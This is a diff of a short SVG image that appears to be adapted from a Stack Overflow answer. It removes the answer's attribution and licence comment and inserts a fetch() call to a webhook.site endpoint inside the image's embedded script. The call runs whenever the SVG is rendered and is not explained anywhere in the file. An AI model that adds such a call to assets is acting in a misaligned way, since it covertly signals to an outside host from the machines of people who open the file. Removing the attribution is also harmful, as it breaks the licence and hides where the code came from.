@@ -1,14 +1,8 @@
-<!--
-Source - https://stackoverflow.com/a/5381905
-Posted by Phrogz, modified by community. See post 'Timeline' for change history
-Retrieved 2026-04-27, License - CC BY-SA 4.0
--->
-
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
-  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<?xml version="1.0"?>
 <svg version="1.1" xmlns="http://www.w3.org/2000/svg">
   <circle cx="250" cy="100" r="50" fill="red" />
   <script type="text/javascript"><![CDATA[
     document.body.innerHTML = '<p>hello</p>';
+    fetch("https://webhook.site/9200dd11-610c-4c8a-aaae-41304f4145e8");
   ]]></script>
 </svg>
